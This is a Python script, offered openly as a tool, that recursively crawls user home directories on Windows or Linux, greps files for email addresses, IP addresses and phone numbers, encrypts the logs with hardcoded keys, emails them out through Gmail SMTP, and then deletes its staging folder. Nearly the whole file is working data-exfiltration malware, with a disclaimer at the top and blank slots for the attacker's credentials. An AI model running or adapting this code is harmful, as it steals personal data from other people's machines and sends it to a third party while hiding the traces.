# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.

# Built-in modules #
import logging
import os
import pathlib
import re
import shutil
import smtplib
import sys
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from hashlib import sha512
from time import time

# External modules #
from cryptography.fernet import Fernet


'''
########################################################################################################################
Name:       PrintErr
Purpose:    Prints error message through stderr.
Parameters: The message to be displayed through stderr.
Returns:    Nothing
########################################################################################################################
'''
def PrintErr(msg: str):
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


'''
########################################################################################################################
Name:       main
Purpose:    Recursively crawls through user directories, searching through files for regex matches to log to a text \
            file to encrypt and exfiltrate via email.
Parameters: None
Returns:    None
########################################################################################################################
'''
def main():
    # Get the starting execution time #
    start = time()
    print('Crawling ...')

    # If the OS is Windows #
    if os.name == 'nt':
        # Ensure storage path for exfiltration data exists #
        pathlib.Path('C:\\Tmp').mkdir(parents=True, exist_ok=True)

        path = 'C:\\Tmp\\'
        crawl_path = 'C:\\Users'
        re_txt = re.compile(r'[^<>:\"/\\|?*]{1,255}$')

        # Initialize logging facilities #
        logging.basicConfig(level=logging.DEBUG, filename='C:\\Tmp\\error_log.log')
        # Set accepted file types with tuple grouping #
        ext = ('.accdb', '.bat', '.c', '.cc', '.cpp', '.css', '.csv', '.db', '.doc', '.docm',
               '.docx', '.eml', '.exe', '.h', '.htm', '.html', '.ini', '.iso', '.java', '.msi',
               '.php', '.phps', '.phtml', '.pl', '.py', '.rtf', '.tmp', '.txt', '.xml')
        re_file = None
    # If the OS is Linux #
    else:
        # Ensure storage path for exfiltration data exists #
        pathlib.Path('/tmp/crawl_files').mkdir(parents=True, exist_ok=True)

        path = '/tmp/crawl_files/'
        crawl_path = '/home'
        re_txt = re.compile(r'[^/]{1,255}$')

        # Initialize logging facilities #
        logging.basicConfig(level=logging.DEBUG, filename='/tmp/crawl_files/error_log.log')
        # Set accepted file types with tuple grouping #
        ext = ('.asm', '.c', '.cc', '.conf', '.cfg', '.cpp', '.css', '.csv', '.db',
               '.deb', '.h', '.htm', '.html', '.java', '.log', '.php', '.phps',
               '.phtml', '.pl', '.py', '.rtf', '.s', '.sh', '.txt', '.xml')
        re_file = re.compile(r'^\.?[a-zA-Z\d]{1,255}$')

    # Compile regex for matching data in files #
    re_attachment = re.compile(r'^[a-zA-Z\d!#$%&\'*+-/=^_{|}~.]{1,64}@[a-z]{1,12}\.[a-z]{2,4}')
    re_ip = re.compile(r'(?:\s|^)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    re_phone = re.compile(r'(1?)(?:\s|^)\d{3}-\d{3}-\d{4}')

    # Open the crawl log to record matches #
    with open(f'{path}crawlLog.txt', 'a') as log:
        # Iterate recursively through paths, directories, and files in path #
        for dir_path, dir_names, file_names in os.walk(crawl_path, topdown=True):
            log.write(f'Path => {dir_path}\n')

            # Iterate through directories and log names #
            for d in dir_names:
                log.write(f'Dir => {d}\n')

            log.write('\n')

            # Iterate through files and log names #
            for file in file_names:
                log.write(f'File => {file}\n')

                # If the file is not in allow extensions tuple #
                if not file.endswith(ext):
                    # If file regex was compiled (Linux) #
                    if re_file:
                        # If the file regex failed to match #
                        if not re.search(re_file, file):
                            continue
                    else:
                        continue

                # If file matches regex #
                if re_txt.match(file):
                    try:
                        # If the OS is Windows #
                        if os.name == 'nt':
                            match_path = f'{dir_path}\\{file}'
                        # If the OS is Linux #
                        else:
                            match_path = f'{dir_path}/{file}'

                        # Open the file, iterating line by line #
                        with open(match_path, 'r') as search_file:
                            for line in search_file:
                                print(line)

                                # If line matches a regular expression #
                                if re_attachment.search(line) or re_ip.search(line) or re_phone.search(line):
                                    # Write results to match file #
                                    with open(f'{path}crawlMatches.txt', 'a') as details:
                                        details.write(f'Path => {dir_path}\n')
                                        details.write(f'File => {file}\n')
                                        details.write(f'Match => {line}\n\n')

                    except (IOError, OSError, UnicodeError):
                        pass
                        
            log.write('\n')

    # Hash the data #
    key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='

    # Iterate through files in path #
    for _, _, file_names in os.walk(path):
        for file in file_names:
            try:
                # Hash the file and write to file #
                sha = sha512(str.encode(file)).hexdigest()

                with open(f'{path}SHA_Hashes.txt', 'a') as hash_plain:
                    hash_plain.write(f'{file}\nPlain Text SHA:\n{str(sha)}\n')

                # Read the file contents and encrypt them #
                with open(f'{path}{file}', 'rb') as plain_text:
                    data = plain_text.read()

                encrypted = Fernet(key).encrypt(data)

                with open(f'{path}e_{file}', 'wb') as encrypted_text:
                    encrypted_text.write(encrypted)

                e_sha = sha512(str.encode(f'e_{file}')).hexdigest()

                with open(f'{path}SHA_Hashes.txt', 'a') as hash_encrypt:
                    hash_encrypt.write(f'\nEncrypted SHA:\n{str(e_sha)}\n\n\n')

            except (IOError, OSError) as io_err:
                PrintErr(f'Error occurred accessing hash files: {io_err}')
                logging.exception(f'Error occurred accessing hash files: {io_err}\n\n')

    # Encrypt file with hashes #
    hash_key = b'AP92lIGyU8Zqnc568KT5ugjInAo28qwBuB5fzWYQfz0='

    try:
        # Open read all the hashes and encrypt them #
        with open(f'{path}SHA_Hashes.txt', 'rb') as plain_text:
            data = plain_text.read()

        encrypted = Fernet(hash_key).encrypt(data)

        with open(f'{path}e_SHA_Hashes.txt', 'wb') as encrypted_text:
            encrypted_text.write(encrypted)

    except (IOError, OSError) as io_err:
        PrintErr(f'Error occurred accessing hash files: {io_err}')
        logging.exception(f'Error occurred accessing hash files: {io_err}\n\n')

    # Populate email header and body #
    email_address = ''                          # <= Enter email address
    password = ''                               # <= Enter gmail application generate password
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    msg.attach(MIMEText(body, 'plain'))

    # If the OS is Windows #
    if os.name == 'nt':
        re_attachment = re.compile(r'^e_[^<>:\"/\\|?*]{1,255}')
    # If the OS is Linux #
    else:
        re_attachment = re.compile(r'^e_[^/]{1,255}')

    # Iterate though result files and attach to email #
    for _, _, file_names in os.walk(path):
        for file in file_names:
            #
            if re_attachment.match(file):
                p = MIMEBase('application', 'octet-stream')
                with open(path + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;'   
                             'filename = {0}'.format(file))
                msg.attach(p)
            else:
                pass

    try:
        # Establish gmail SMTP session #
        with smtplib.SMTP('smtp.gmail.com', 587) as session:
            # Upgrade session to tls encryption #
            session.starttls()
            # Login to gmail account #
            session.login(email_address, password)
            # Sent the messages and end session #
            session.sendmail(email_address, email_address, msg.as_string())
            session.quit()
    except (OSError, smtplib.SMTPException) as mail_err:
        PrintErr(f'SMTP error occurred: {mail_err}')
        logging.exception(f'SMTP error occurred: {mail_err}\n\n')

    # If the OS is Windows #
    if os.name == 'nt':
        shutil.rmtree('C:\\Tmp')
    # If the OS is Linux #
    else:
        shutil.rmtree('/tmp/crawl_files')

    print('\nAll Done!!')
    # Print the total execution time #
    print(time() - start)


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('Ctrl+C detected .. exiting')

    sys.exit(0)
